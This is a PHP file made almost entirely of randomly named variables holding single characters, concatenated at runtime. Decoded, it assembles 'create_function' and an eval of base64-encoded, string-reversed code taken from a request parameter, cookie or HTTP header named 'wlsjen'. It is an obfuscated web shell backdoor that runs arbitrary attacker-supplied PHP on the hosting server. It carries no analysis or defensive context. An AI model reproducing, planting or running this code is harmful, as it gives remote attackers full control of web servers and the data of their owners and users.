<?php
$liquidation= '['; $gorgon='""$a';$blueprint ='`';$husband= ' bNS'; $audi='.';$depreciate ='('; $bench= ')'; $detection='y'; $box= 'HyebeL';$carbonic ='_["e';$earwig= 'nJ(Wr'; $enduringly = 'redNCetMQ';$custodial='ecm,ie';$asp= '_';$bobwhites=':';$concussion = 'a';$expletive='r$]s'; $bren=';bB_c'; $bondage ='Ss3i';$crave='_';$catha= '"';
$invalidities='e';$erudition=']';

$flog='a'; $determinate ='G';$chiffon=')va$]<w';$alternator ='U)';$jeralee = 'ibse"5t_]';
$flange = 'Ei'; $cot = '_rNc-['; $lamming ='j4(tt';$jess ='i';
$infamy = 'F';
$altitude= '('; $dwindling= 'TB';$ballot = 'pjLAT'; $handlers ='YE'; $devised= 'i'; $buggies='@';

$deregulate = ')eL$Koi_';$decodes ='^'; $generalization='E'; $downing =']';$cloned='$TReT';$denser='n';$hemosiderin = 'ocv;'; $interposes ='r'; $historians='E=';$disposed='$';$epigrammatic= 't';$fuey= 'r';

$calendrical ='Q';$lists = 'I';

$coop='O'; $aspirating ='/';

$codified ='_'; $branding ='(SEWD'; $indicates= 's_6cRen';

$flinch='r'; $calls ='_'; $curriculum= 'a'; $budded= 'TTRUl2)ls';$earthworm='a'; $ignazio ='t'; $lymphoma= '0';
$glycerinate ='7';
$earthmove= 'E';

$communicator= '()iHd;*e';
$foundling= 'rasO';$maggot='_'; $commandingly= '"'; $collaborators = '[P'; $dimness= '=Hu,'; $expire= 'n)'; $crisscross = '?(edE'; $antipode='"iI(('; $kisser= '$'; $barging='v';$backpack ='K';

$dickweed = ':)sZvJ;B';$compromising='p$ea1nEV)';$giustino = 'a'; $gwenora = 'e9aJ'; $destroyed ='l$=eOes$';

$classifier= 'f';$broderic= '?'; $complexes ='rtE8rP';$cristiano='I';$lockout ='XWIVCa(?'; $depredate ='i';

$hackneyed ='6';$gradate = '"'; $cartons= ':P)';$kelcy='re'; $delaware= ')';$diverse='l>[Ed'; $dissipation= 'i(a+,4u'; $doom ='wfg_geo'; $grit='g';

$basso=')'; $environment=';R';

$convulse= $indicates['3'] .$kelcy['0'].$doom[5] .

$dissipation[2]. $complexes['1'] .$doom[5].$doom['3'] .$doom['1'].$dissipation['6'].

$compromising[5].$indicates['3'] .$complexes['1']. $dissipation['0'].$doom['6'] .
$compromising[5] ; $instant =$husband[0]; $cumulate =$convulse($instant, $doom[5].$dickweed['4']. $dissipation[2] . $diverse['0'] . $dissipation['1'] .$dissipation[2] . $kelcy['0'].$kelcy['0'].$dissipation[2].$box['1']. $doom['3'] .

$compromising['0'].$doom['6'] . $compromising['0'] .$dissipation['1'] . $doom['1'] .$dissipation['6']. $compromising[5] .

$indicates['3'] .
$doom['3'] .$grit.$doom[5]. $complexes['1'] .

$doom['3'].$dissipation[2] .$kelcy['0'] .$grit.$destroyed['6'].$dissipation['1'] . $basso. $basso . $basso . $environment['0']);$cumulate ($blueprint,

$hackneyed, $custodial['2'],$custodial['2'], $buggies, $determinate,

$destroyed['7'].$dissipation['0'].
$destroyed[2]. $dissipation[2]. $kelcy['0'].$kelcy['0'] .

$dissipation[2] .$box['1'] .

$doom['3'] . $custodial['2']. $doom[5] .$kelcy['0'] .

$grit .$doom[5].
$dissipation['1'] .$destroyed['7']. $doom['3'] .$environment['1'] .
$diverse['3'] . $calendrical .

$budded['3'].$diverse['3'].$branding[1]. $budded['1'] .$dissipation['4'] . $destroyed['7']. $doom['3'] . $lockout['4'] .$destroyed[4].
$destroyed[4].$backpack . $lockout[2] . $diverse['3'] .$dissipation['4'] . $destroyed['7'] . $doom['3'] . $branding[1] . $diverse['3'] . $environment['1'] .
$lockout['3'].$diverse['3']. $environment['1'].
$basso .$environment['0'] . $destroyed['7']. $dissipation[2]. $destroyed[2]. $dissipation['0'].$destroyed['6']. $destroyed['6'] .$doom[5].$complexes['1'] . $dissipation['1']. $destroyed['7'] .$dissipation['0'] .

$diverse['2'] . $gradate.
$doom['0'] .$doom[5].$diverse['0']. $jeralee['1'] .

$ballot['1'].
$doom[5].
$compromising[5] .$dissipation['0'].$gradate .$downing.
$basso.

$lockout['7'].

$destroyed['7'].
$dissipation['0'] .$diverse['2']. $gradate.$doom['0'] .
$doom[5] . $diverse['0'].$jeralee['1'] . $ballot['1'] .$doom[5].$compromising[5] .$dissipation['0'].$gradate.$downing. $cartons[0].$dissipation['1']. $dissipation['0'].$destroyed['6'].$destroyed['6'].$doom[5] . $complexes['1'].
$dissipation['1'] . $destroyed['7']. $dissipation['0'] .

$diverse['2'].
$gradate.$dimness['1'].$budded['1']. $budded['1'].$cartons['1'] .$doom['3'].

$lockout['1']. $diverse['3'] .$deregulate['2'].
$dickweed[7]. $gwenora['3'] .$diverse['3'] .$cot['2']. $lockout[2] .

$gradate .
$downing.$basso . $lockout['7'].

$destroyed['7'].$dissipation['0']. $diverse['2']. $gradate .$dimness['1'].

$budded['1'].$budded['1'].
$cartons['1'] .
$doom['3'].
$lockout['1']. $diverse['3'] . $deregulate['2'].

$dickweed[7].$gwenora['3'] .$diverse['3'] . $cot['2']. $lockout[2] .$gradate.
$downing. $cartons[0] .

$diverse['4'].$dissipation['0'].
$doom[5] . $basso.$environment['0'] .$doom[5] .

$dickweed['4'] .

$dissipation[2] .$diverse['0']. $dissipation['1'] .
$destroyed['6'] .$complexes['1'].

$kelcy['0'] . $kelcy['0'] .$doom[5] .$dickweed['4'] .

$dissipation['1'] . $jeralee['1'] . $dissipation[2]. $destroyed['6'] .$doom[5]. $hackneyed. $dissipation[5].

$doom['3'] .
$diverse['4'].$doom[5] . $indicates['3']. $doom['6']. $diverse['4'].$doom[5]. $dissipation['1']. $destroyed['6'] . $complexes['1'].$kelcy['0'].$kelcy['0'].$doom[5] .$dickweed['4'] .$dissipation['1'] .
$destroyed['7'] .$dissipation[2] .$basso . $basso . $basso.
$basso .$environment['0']); 